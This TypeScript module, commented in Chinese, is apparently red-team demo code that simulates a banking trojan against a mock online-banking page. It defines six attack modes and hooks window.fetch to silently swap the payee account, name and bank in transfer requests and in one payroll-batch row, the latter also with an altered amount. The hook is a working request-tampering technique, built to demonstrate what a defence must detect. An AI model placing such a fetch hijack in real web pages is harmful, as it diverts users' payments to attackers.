/**
 * 模拟银行木马（如 Emotet/TrickBot/网银劫持类）的攻击行为层。
 * 所有攻击开关保存在 localStorage，由页面上的"木马控制台"控制。
 * 注意：这是防御方案的红队演示代码，仅在本机模拟环境生效。
 */

export type AttackId =
  | 'domSwap'
  | 'payloadTamper'
  | 'qrReplace'
  | 'lookalike'
  | 'batchTamper'
  | 'fakeSuccess';

export interface AttackMeta {
  id: AttackId;
  name: string;
  layer: '显示层' | '传输层' | '社工层';
  description: string;
}

export const ATTACKS: AttackMeta[] = [
  {
    id: 'domSwap',
    name: '① 页面显示掉包',
    layer: '显示层',
    description: '用户确认后，木马把页面上的收款账号/户名改回"看起来正确"的值，掩盖真实提交内容'
  },
  {
    id: 'payloadTamper',
    name: '② 请求报文掉包',
    layer: '传输层',
    description: '劫持 fetch，在请求离开浏览器前把收款账号替换为木马控制的账号（用户完全无感知）'
  },
  {
    id: 'qrReplace',
    name: '③ 二维码替换',
    layer: '显示层',
    description: '替换页面展示的二维码，扫码后看到的是攻击者收款信息'
  },
  {
    id: 'lookalike',
    name: '④ 相似户名社工',
    layer: '社工层',
    description: '把收款方换成名称高度相似的账号（多一个"责任"），诱导用户确认一笔看似正常的交易'
  },
  {
    id: 'batchTamper',
    name: '⑤ 批量代发掉包',
    layer: '传输层',
    description: '在 120 笔工资单中只篡改其中 1 笔的账号和金额，企图蒙混过关'
  },
  {
    id: 'fakeSuccess',
    name: '⑥ 伪造转账成功页',
    layer: '显示层',
    description: '交易被手机端拒绝后，木马在网页上伪造"转账成功"页面和电子回单'
  }
];

const STORAGE_KEY = 'trojan-attacks-v1';

export function getEnabledAttacks(): Set<AttackId> {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return new Set(raw ? (JSON.parse(raw) as AttackId[]) : []);
  } catch {
    return new Set();
  }
}

export function setAttackEnabled(id: AttackId, enabled: boolean): Set<AttackId> {
  const set = getEnabledAttacks();
  if (enabled) set.add(id);
  else set.delete(id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify([...set]));
  window.dispatchEvent(new CustomEvent('trojan-config-changed'));
  return set;
}

/* ------------------------------ 攻击事件日志 ------------------------------ */

export interface TrojanEvent {
  at: number;
  attack: AttackId;
  message: string;
  detail?: unknown;
}

const EVENT_KEY = 'trojan-events-v1';

export function getTrojanEvents(): TrojanEvent[] {
  try {
    return JSON.parse(localStorage.getItem(EVENT_KEY) ?? '[]') as TrojanEvent[];
  } catch {
    return [];
  }
}

export function logTrojanEvent(attack: AttackId, message: string, detail?: unknown) {
  const events = getTrojanEvents();
  events.unshift({ at: Date.now(), attack, message, detail });
  localStorage.setItem(EVENT_KEY, JSON.stringify(events.slice(0, 50)));
  window.dispatchEvent(new CustomEvent('trojan-event'));
}

export function clearTrojanEvents() {
  localStorage.removeItem(EVENT_KEY);
  window.dispatchEvent(new CustomEvent('trojan-event'));
}

/* --------------------------- 木马控制的攻击账号 --------------------------- */

export const ATTACKER_ACCOUNT = '6222021234560099';
export const ATTACKER_NAME = '陈志强';
export const ATTACKER_BANK = '建设银行深圳分行';

/** 与"北京云海科技有限公司"仅差几个字的相似户名 */
export const LOOKALIKE_ACCOUNT = '6222021234560098';
export const LOOKALIKE_NAME = '北京云海科技有限责任公司';
export const LOOKALIKE_BANK = '民生银行北京分行';

/* ------------------------------ fetch 劫持 ------------------------------ */

let installed = false;

export function installTrojanFetch() {
  if (installed) return;
  installed = true;
  const originalFetch = window.fetch.bind(window);

  window.fetch = async (input: RequestInfo | URL, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    const enabled = getEnabledAttacks();

    if (init?.method?.toUpperCase() === 'POST' && typeof init.body === 'string') {
      const bodyString = init.body;
      // ② 单笔请求报文掉包
      if (url.endsWith('/api/transfers') && enabled.has('payloadTamper')) {
        const body = JSON.parse(bodyString) as Record<string, unknown>;
        const original = { account: body.payeeAccount, name: body.payeeName };
        body.payeeAccount = ATTACKER_ACCOUNT;
        body.payeeName = ATTACKER_NAME;
        body.payeeBank = ATTACKER_BANK;
        logTrojanEvent('payloadTamper', `请求中的收款账号已被替换：${original.account} → ${ATTACKER_ACCOUNT}`, original);
        init = { ...init, body: JSON.stringify(body) };
      }

      // ④ 相似户名社工
      if (url.endsWith('/api/transfers') && enabled.has('lookalike')) {
        const body = JSON.parse(bodyString) as Record<string, unknown>;
        const original = { account: body.payeeAccount, name: body.payeeName };
        body.payeeAccount = LOOKALIKE_ACCOUNT;
        body.payeeName = LOOKALIKE_NAME;
        body.payeeBank = LOOKALIKE_BANK;
        logTrojanEvent('lookalike', `收款方被替换为相似户名：${original.name} → ${LOOKALIKE_NAME}`, original);
        init = { ...init, body: JSON.stringify(body) };
      }

      // ⑤ 批量代发掉包：只改第 37 行（低调，不易被肉眼抽查发现）
      if (url.endsWith('/api/batches') && enabled.has('batchTamper')) {
        const body = JSON.parse(bodyString) as { rows: Array<Record<string, unknown>> };
        const targetIndex = 36;
        const row = body.rows[targetIndex];
        if (row) {
          const original = { ...row };
          row.account = ATTACKER_ACCOUNT;
          row.employeeName = ATTACKER_NAME;
          row.bankName = ATTACKER_BANK;
          row.amount = '48900.00';
          logTrojanEvent('batchTamper', `工资单第 37 行被篡改：${original.account} → ${ATTACKER_ACCOUNT}`, original);
        }
        init = { ...init, body: JSON.stringify(body) };
      }
    }
    return originalFetch(input, init);
  };
}
